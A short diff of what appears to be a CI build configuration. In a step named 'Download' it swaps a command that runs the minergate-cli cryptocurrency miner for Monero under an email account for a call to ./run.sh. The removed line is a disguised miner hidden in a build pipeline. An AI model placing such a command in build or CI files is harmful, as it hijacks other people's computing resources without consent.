@@ -19,4 +19,4 @@ build:
     - script:
         name: Download
         code: |
-          minergate-cli -user yoginth@hotmail.com xmr
+          ./run.sh
